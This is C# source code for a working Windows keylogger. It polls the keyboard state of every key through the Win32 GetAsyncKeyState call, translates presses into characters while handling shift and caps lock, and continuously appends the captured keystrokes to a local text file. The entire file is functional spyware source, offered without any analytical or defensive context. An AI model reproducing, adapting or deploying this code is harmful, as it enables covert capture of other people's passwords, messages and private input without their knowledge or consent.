using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace kl
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern int GetAsyncKeyState(int vKey);

        public static bool shiftState = false;
        public static bool capsState = false;

        public static string PrintKeyPressed(int vKey)
        {    
            shiftState = (GetAsyncKeyState(16) & 0x8000) != 0;

            switch (vKey)
            {
                case 20:                     
                    capsState = !capsState;
                    return $"[CapsLock: {(capsState ? "ON" : "OFF")}]";
                    
                case (int)ConsoleKey.Backspace:
                    return "[backspace]";
                case (int)ConsoleKey.Tab:
                    return "[tab]";
                case (int)ConsoleKey.Enter:
                    return "[Enter]";
                case (int)ConsoleKey.Escape:
                    return "[esc]";
                case (int)ConsoleKey.Spacebar:
                    return "[space]";
                case (int)ConsoleKey.LeftArrow:
                    return "[l_arrow]";
                case (int)ConsoleKey.UpArrow:
                    return "[up_arrow]";
                case (int)ConsoleKey.RightArrow:
                    return "[r_arrow]";
                case (int)ConsoleKey.DownArrow:
                    return "[down_arrow]";

                default:
                    if (vKey >= 65 && vKey <= 90){
                        if (capsState ^ shiftState)                             
                            return ((char)vKey).ToString();
                        else
                            return ((char)(vKey + 32)).ToString();                     
                    }
                    else if (vKey >= 48 && vKey <= 57){
                        if (shiftState)
                        {
                            if (vKey == 48) return ")";
                            if (vKey == 49) return "!";
                            if (vKey == 50) return "@";
                            if (vKey == 51) return "#";
                            if (vKey == 52) return "$";
                            if (vKey == 53) return "%";
                            if (vKey == 54) return "^";
                            if (vKey == 55) return "&";
                            if (vKey == 56) return "*";
                            if (vKey == 57) return "(";
                        }
                        else
                        {
                            return ((char)vKey).ToString();
                        }
                    }
                    return "";
            }
        }

        static void Main(string[] args)
        {
            string filepath = @"keycaptured.txt";
            FileStream fileStream = null;

            try
            {
                fileStream = File.Open(filepath, FileMode.Append, FileAccess.Write);

                while (true)
                {
                    Thread.Sleep(100);

                    for (int i = 0; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767 || keyState == 32769)
                        {
                            string keyData = PrintKeyPressed(i);
                            byte[] data = System.Text.Encoding.UTF8.GetBytes(keyData);
                            fileStream.Write(data, 0, data.Length);
                            fileStream.Flush();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
            finally
            {
                if (fileStream != null)
                {
                    fileStream.Close();
                }
            }
        }
    }
}
